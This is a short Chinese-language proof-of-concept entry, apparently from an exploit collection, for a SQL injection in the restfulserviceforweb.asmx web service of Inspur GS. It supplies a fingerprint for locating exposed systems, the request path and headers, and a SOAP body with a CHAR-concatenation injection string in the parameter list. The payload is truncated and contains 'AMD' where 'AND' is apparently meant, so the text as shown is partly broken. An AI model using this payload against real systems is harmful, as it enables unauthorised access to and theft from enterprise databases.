# 浪潮GS的restfulserviceforweb.asmx存在SQL注入漏洞

- **系统**：浪潮GS的　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`body="cwbase/web/scripts/aes.js"`
- **请求**：`POST /GSPIDM/gsp/webservice/restfulwebservice/restfulserviceforweb.asmx HTTP/1.1`
- **关键头**：`Content-Type: application/soap+xml; charset=utf-8`　`Content-Length: 1187`

**请求体 / payload**
```
<?xml version="1.0" encoding="utf-8"?>
<soap12:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
xmlns:xsd="http://www.w3.org/2001/XMLSchema"
xmlns:soap12="http://www.w3.org/2003/05/soap-envelope">
<soap12:Body>
<Get xmlns="http://tempuri.org/">
<Resource>AuthDataModify</Resource>
<Parameter>
<ArrayOfString>
<string>id</string>
<string>admin' AMD 7707 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(118)+CHAR(113)+CHAR(113)+(SELECT(CASE WHEN (7707=7707) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(113)+CHAR(107)+CHAR(113)))--xMuK</string>
</ArrayOfString>
<ArrayOfString>
<string…（脚本共 708 字，完整版见原文）
```
- **预期**：200　|　—